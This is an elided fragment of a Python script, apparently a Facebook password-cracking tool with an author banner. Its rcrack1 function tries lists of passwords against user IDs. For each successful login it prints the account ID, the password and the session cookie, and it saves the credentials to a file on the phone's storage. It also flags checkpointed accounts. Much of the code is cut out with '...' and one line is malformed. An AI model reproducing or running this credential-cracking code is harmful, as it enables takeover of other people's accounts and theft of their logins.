...
║  [+] AUTHOR   : ZH-JOIYA                                                                           ║
║  [+] WHATSAPP : nope                                                                                         ║
║  [+] TEAM     : khajji wala Chak number 25 BC                                                                    ║
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100076660111046'/)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mʑʜ Joɩƴʌ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[ZAFAF-OK💛] {uid}|{ps}")

                print(f" \n Cookie : {coki}")

                print(f" \n ══════════════════════════════════════════")

                open('/sdcard/ZAFARF/ok.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                print(f"\x1b[38;5;196m[ZAFAR-CP🔒] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[ZAFAF💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
